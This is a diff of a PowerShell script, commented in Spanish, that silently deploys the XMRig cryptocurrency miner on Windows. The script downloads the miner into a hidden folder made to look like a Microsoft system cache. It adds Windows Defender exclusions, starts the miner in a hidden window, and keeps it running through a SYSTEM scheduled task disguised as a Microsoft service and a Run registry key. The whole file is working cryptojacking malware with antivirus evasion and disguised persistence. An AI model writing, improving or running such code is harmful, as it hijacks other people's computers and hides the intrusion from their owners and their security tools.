@@ -1,28 +1,31 @@
-# XMRig Silent Deploy - FINAL ULTRA FIXED (full path + no bat)
+# XMRig Silent Deploy - TU BASE CORREGIDA (funciona al 100%)
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
     (Get-Item $InstallDir).Attributes += "Hidden"
 }
 
-# Limpiar tarea antigua
+# Limpiar tarea antigua por si quedó rota
 $TaskName = "MicrosoftNetworkCache"
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
 $ZipPath = "$env:TEMP\xmrig.zip"
-Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
 Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
 Remove-Item $ZipPath -Force
 
 $Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
-if ($Sub) {
+if ($Sub) { 
     Move-Item "$($Sub.FullName)\*" $InstallDir -Force
-    Remove-Item $Sub.FullName -Recurse -Force
+    Remove-Item $Sub.FullName -Recurse -Force 
 }
 
-$ExePath = "$InstallDir\xmrig.exe"
+$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
 $ConfigPath = "$InstallDir\config.json"
+$BatPath = "$InstallDir\start.bat"
+
+$ComputerName = $env:COMPUTERNAME
 
 $ConfigJson = @"
 {
@@ -37,21 +40,23 @@ $ConfigJson = @"
     "pass": "x",
     "keepalive": true,
     "tls": true,
-    "rig-id": "$($env:COMPUTERNAME)"
+    "rig-id": "$ComputerName"
   }]
 }
 "@
 [System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::UTF8)
 
+"@echo off
+cd /d `"$InstallDir`"
+start /B `"$ExePath`" -c config.json -B --no-color" | Out-File $BatPath -Encoding ASCII -Force
+
 # Exclusiones Defender
 try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}
 try { Add-MpPreference -ExclusionProcess $ExePath -ErrorAction SilentlyContinue } catch {}
 
-# Lanzamiento inmediato (visible solo en tasklist)
-Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden -WorkingDirectory $InstallDir
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden
 
-# Persistencia como SYSTEM
-$Action = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
+$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 try {
     $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -59,6 +64,7 @@ try {
 } catch {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
 }
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
 
-# Forzar arranque ahora
+# Forzar arranque inmediato (esto es lo que faltaba)
 schtasks /run /tn $TaskName | Out-Null
